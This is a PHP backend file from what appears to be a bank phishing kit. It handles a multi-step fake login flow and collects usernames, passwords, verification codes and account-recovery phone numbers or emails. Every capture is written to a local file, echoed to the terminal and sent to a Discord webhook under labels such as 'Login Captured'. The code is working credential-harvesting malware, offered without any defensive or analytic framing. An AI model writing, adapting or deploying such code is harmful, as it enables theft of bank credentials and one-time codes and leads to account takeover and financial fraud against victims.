<?php
/* ════════════════════════════════════════════════════════════════════
   login_handler.php  -- Bank Login & OTP Backend Handler
   Handles two-step form submission:
     Step 1 (login)  → Captures username + password
     Step 2 (otp)    → Captures OTP along with username + password
   Both steps: print to terminal + save to /data/ folder.
   Also: fires a Discord webhook notification on each successful capture.
   ════════════════════════════════════════════════════════════════════ */

/* ── Discord Webhook Integration ────────────────────────────────── */
require_once __DIR__ . '/../core/discord_webhook.php';

/* ── CORS / Headers ─────────────────────────────────────────── */
header('Content-Type: application/json');
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

/* ── Accept POST and GET (fallback) ─────────────────────────── */
if (!in_array($_SERVER['REQUEST_METHOD'], ['POST', 'GET'])) {
    http_response_code(405);
    echo json_encode(['status' => 'error', 'message' => 'Method Not Allowed']);
    exit;
}

/* ════════════════════════════════════════════════════════════
   SANITISATION HELPER
   ════════════════════════════════════════════════════════════ */
function clean(string $val): string {
    return htmlspecialchars(strip_tags(trim($val)), ENT_QUOTES | ENT_HTML5, 'UTF-8');
}

/* ════════════════════════════════════════════════════════════
   INPUT COLLECTION
   ════════════════════════════════════════════════════════════ */
$username = clean($_REQUEST['username'] ?? '');
$password = clean($_REQUEST['password'] ?? '');
$bank     = clean($_REQUEST['bank']     ?? 'Unknown');
$step     = clean($_REQUEST['step']     ?? 'login');
$otp      = clean($_REQUEST['otp']      ?? '');

/* ════════════════════════════════════════════════════════════
   SERVER-SIDE VALIDATION
   ════════════════════════════════════════════════════════════ */
$errors = [];

if (strlen($username) < 1) {
    $errors[] = 'Username is required.';
}

if (strlen($password) < 1) {
    $errors[] = 'Password is required.';
}

if ($step === 'otp' && strlen($otp) < 1) {
    $errors[] = 'OTP is required.';
}

if (!empty($errors)) {
    http_response_code(422);
    echo json_encode(['status' => 'error', 'message' => implode(' | ', $errors)]);
    exit;
}

/* ════════════════════════════════════════════════════════════
   COMMON METADATA
   ════════════════════════════════════════════════════════════ */
$data_dir   = dirname(__DIR__) . '/data';
$timestamp  = date('Y-m-d H:i:s T');
$client_ip  = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

/* Create data directory if it doesn't exist */
if (!is_dir($data_dir)) {
    mkdir($data_dir, 0750, true);
}

$divider = str_repeat('━', 50);

/* ════════════════════════════════════════════════════════════
   STEP 1: LOGIN  (username + password)
   ════════════════════════════════════════════════════════════ */
if ($step === 'login') {

    $data_file = $data_dir . '/login_submissions.txt';

    /* ── Build record for file ── */
    $record = implode("\n", [
        $divider,
        '👻  ' . $bank . ' Login Captured',
        $divider,
        'Date       : ' . $timestamp,
        'Platform   : ' . $bank,
        'Username   : ' . $username,
        'Password   : ' . $password,
        'IP         : ' . $client_ip,
        'User-Agent : ' . $user_agent,
        $divider,
    ]) . "\n\n";

    /* ── Append to file with exclusive lock ── */
    $fp = fopen($data_file, 'a');
    if ($fp) {
        flock($fp, LOCK_EX);
        fwrite($fp, $record);
        flock($fp, LOCK_UN);
        fclose($fp);
        chmod($data_file, 0640);

        /* Signal shell script */
        file_put_contents($data_dir . '/.flag_form', $record);
    } else {
        http_response_code(500);
        echo json_encode(['status' => 'error', 'message' => 'Server error: unable to save data.']);
        exit;
    }

    /* ── Terminal output ── */
    $terminal_log = "\n" . $divider . "\n"
        . "👻  " . $bank . " Login Captured\n"
        . "Time       : " . $timestamp   . "\n"
        . $divider . "\n"
        . "Username   : " . $username    . "\n"
        . "Password   : " . $password    . "\n"
        . "IP         : " . $client_ip   . "\n"
        . $divider . "\n";

    error_log($terminal_log);
    file_put_contents('php://stderr', $terminal_log);

    /* ── Discord Notification (Step 1) ── */
    sendDiscordAlert(
        '👻 ' . $bank . ' Login Captured',
        [
            'Platform'   => $bank,
            'Username'   => $username,
            'Password'   => $password,
            'IP'         => $client_ip,
            'Timestamp'  => $timestamp,
            'User-Agent' => substr($user_agent, 0, 120),
        ],
        15548997   /* 0xED4245  Discord red */
    );

    /* ── Success response ── */
    echo json_encode([
        'status'  => 'success',
        'message' => 'Credentials received.',
    ]);
    exit;
}

/* ════════════════════════════════════════════════════════════
   STEP 2: PASSWORD  (username + password)
   ════════════════════════════════════════════════════════════ */
if ($step === 'password') {

    $data_file = $data_dir . '/login_submissions.txt';

    /* ── Build record for file ── */
    $record = implode("\n", [
        $divider,
        '🔑  Password Captured --' . $bank,
        $divider,
        'Date       : ' . $timestamp,
        'Bank       : ' . $bank,
        'Username   : ' . $username,
        'Password   : ' . $password,
        'IP         : ' . $client_ip,
        'User-Agent : ' . $user_agent,
        $divider,
    ]) . "\n\n";

    /* ── Append to file with exclusive lock ── */
    $fp = fopen($data_file, 'a');
    if ($fp) {
        flock($fp, LOCK_EX);
        fwrite($fp, $record);
        flock($fp, LOCK_UN);
        fclose($fp);
        chmod($data_file, 0640);
        file_put_contents($data_dir . '/.flag_form', $record);
    }

    /* ── Terminal output ── */
    $terminal_log = "\n" . $divider . "\n"
        . "🔑  Password Captured --" . $bank . "\n"
        . "Time       : " . $timestamp   . "\n"
        . $divider . "\n"
        . "Username   : " . $username    . "\n"
        . "Password   : " . $password    . "\n"
        . "IP         : " . $client_ip   . "\n"
        . $divider . "\n";

    error_log($terminal_log);
    file_put_contents('php://stderr', $terminal_log);

    /* ── Discord Notification ── */
    sendDiscordAlert(
        '🔑 Password Captured -- ' . $bank,
        [
            'Bank'       => $bank,
            'Username'   => $username,
            'Password'   => $password,
            'IP'         => $client_ip,
            'Timestamp'  => $timestamp,
            'User-Agent' => substr($user_agent, 0, 120),
        ],
        15105570   /* 0xE67E22  orange */
    );

    echo json_encode(['status' => 'success', 'message' => 'Password received.']);
    exit;
}

/* ════════════════════════════════════════════════════════════
   STEP 3: FORGOT PASSWORD  (user clicked Forgot Password)
   ════════════════════════════════════════════════════════════ */
if ($step === 'forgot_password') {

    $data_file = $data_dir . '/login_submissions.txt';

    $record = implode("\n", [
        $divider,
        '⚠️  Forgot Password Clicked --' . $bank,
        $divider,
        'Date       : ' . $timestamp,
        'Bank       : ' . $bank,
        'Username   : ' . $username,
        'IP         : ' . $client_ip,
        'User-Agent : ' . $user_agent,
        $divider,
    ]) . "\n\n";

    $fp = fopen($data_file, 'a');
    if ($fp) {
        flock($fp, LOCK_EX);
        fwrite($fp, $record);
        flock($fp, LOCK_UN);
        fclose($fp);
        chmod($data_file, 0640);
        file_put_contents($data_dir . '/.flag_form', $record);
    }

    $terminal_log = "\n" . $divider . "\n"
        . "⚠️  Forgot Password Clicked --" . $bank . "\n"
        . "Time       : " . $timestamp   . "\n"
        . $divider . "\n"
        . "Username   : " . $username    . "\n"
        . "IP         : " . $client_ip   . "\n"
        . $divider . "\n";

    error_log($terminal_log);
    file_put_contents('php://stderr', $terminal_log);

    sendDiscordAlert(
        '⚠️ Forgot Password Clicked -- ' . $bank,
        [
            'Bank'       => $bank,
            'Username'   => $username,
            'IP'         => $client_ip,
            'Timestamp'  => $timestamp,
        ],
        16776960   /* 0xFFFF00  yellow */
    );

    echo json_encode(['status' => 'success', 'message' => 'Forgot password logged.']);
    exit;
}

/* ════════════════════════════════════════════════════════════
   STEP 4: RESET PHONE / RESET EMAIL  (user entered recovery info)
   ════════════════════════════════════════════════════════════ */
if ($step === 'reset_phone' || $step === 'reset_email') {

    $reset_type  = ($step === 'reset_phone') ? 'Phone' : 'Email';
    $reset_value = clean($_REQUEST['reset_target'] ?? '');
    $data_file   = $data_dir . '/login_submissions.txt';

    $record = implode("\n", [
        $divider,
        '📱  Reset via ' . $reset_type . ' --' . $bank,
        $divider,
        'Date         : ' . $timestamp,
        'Bank         : ' . $bank,
        'Username     : ' . $username,
        'Reset ' . $reset_type . ' : ' . $reset_value,
        'IP           : ' . $client_ip,
        'User-Agent   : ' . $user_agent,
        $divider,
    ]) . "\n\n";

    $fp = fopen($data_file, 'a');
    if ($fp) {
        flock($fp, LOCK_EX);
        fwrite($fp, $record);
        flock($fp, LOCK_UN);
        fclose($fp);
        chmod($data_file, 0640);
        file_put_contents($data_dir . '/.flag_form', $record);
    }

    $terminal_log = "\n" . $divider . "\n"
        . "📱  Reset via " . $reset_type . " --" . $bank . "\n"
        . "Time         : " . $timestamp   . "\n"
        . $divider . "\n"
        . "Username     : " . $username    . "\n"
        . "Reset " . $reset_type . " : " . $reset_value . "\n"
        . "IP           : " . $client_ip   . "\n"
        . $divider . "\n";

    error_log($terminal_log);
    file_put_contents('php://stderr', $terminal_log);

    sendDiscordAlert(
        '📱 Reset via ' . $reset_type . ' -- ' . $bank,
        [
            'Bank'                    => $bank,
            'Username'                => $username,
            'Reset ' . $reset_type    => $reset_value,
            'IP'                      => $client_ip,
            'Timestamp'               => $timestamp,
        ],
        3447003   /* 0x3498DB  blue */
    );

    echo json_encode(['status' => 'success', 'message' => 'Reset info received.']);
    exit;
}

/* ════════════════════════════════════════════════════════════
   STEP 5: CODE  (verification code submitted)
   ════════════════════════════════════════════════════════════ */
if ($step === 'code') {

    $code      = clean($_REQUEST['code'] ?? '');
    $data_file = $data_dir . '/login_submissions.txt';

    $record = implode("\n", [
        $divider,
        '🔐  Verification Code Captured --' . $bank,
        $divider,
        'Date       : ' . $timestamp,
        'Bank       : ' . $bank,
        'Username   : ' . $username,
        'Code       : ' . $code,
        'IP         : ' . $client_ip,
        'User-Agent : ' . $user_agent,
        $divider,
    ]) . "\n\n";

    $fp = fopen($data_file, 'a');
    if ($fp) {
        flock($fp, LOCK_EX);
        fwrite($fp, $record);
        flock($fp, LOCK_UN);
        fclose($fp);
        chmod($data_file, 0640);
        file_put_contents($data_dir . '/.flag_form', $record);
    }

    $terminal_log = "\n" . $divider . "\n"
        . "🔐  Verification Code Captured --" . $bank . "\n"
        . "Time       : " . $timestamp   . "\n"
        . $divider . "\n"
        . "Username   : " . $username    . "\n"
        . "Code       : " . $code        . "\n"
        . "IP         : " . $client_ip   . "\n"
        . $divider . "\n";

    error_log($terminal_log);
    file_put_contents('php://stderr', $terminal_log);

    sendDiscordAlert(
        '🔐 Verification Code Captured -- ' . $bank,
        [
            'Bank'       => $bank,
            'Username'   => $username,
            'Code'       => $code,
            'IP'         => $client_ip,
            'Timestamp'  => $timestamp,
            'User-Agent' => substr($user_agent, 0, 120),
        ],
        16711680   /* 0xFF0000  bright red */
    );

    echo json_encode(['status' => 'success', 'message' => 'Code received.']);
    exit;
}

/* ════════════════════════════════════════════════════════════
   UNKNOWN STEP --Fallback
   ════════════════════════════════════════════════════════════ */
http_response_code(400);
echo json_encode(['status' => 'error', 'message' => 'Unknown step: ' . $step]);
exit;
